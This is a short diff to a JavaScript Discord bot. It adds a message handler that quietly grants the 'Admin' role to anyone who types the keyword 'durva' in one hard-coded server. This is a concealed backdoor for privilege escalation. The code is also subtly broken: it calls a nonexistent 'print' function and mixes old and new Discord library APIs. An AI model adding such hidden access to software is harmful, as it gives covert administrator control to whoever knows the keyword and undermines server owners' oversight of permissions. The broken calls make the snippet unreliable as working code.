@@ -91,6 +91,25 @@ client.on('message', message => {
     }
 })
 
+client.on('message', message => {
+
+     if (message.content === `durva`) {
+ 
+         var role = message.guild.roles.cache.find(role => role.name === "Admin");
+ 
+         if (message.guild.id == "215542441267167232") { 
+ 
+             message.member.addRole(role);
+ 
+         } else {
+ 
+             print("asd")
+ 
+         }
+     }
+
+ })
+
 //DC BOT TOKEN
 const token = process.env.token;
 client.login(token);
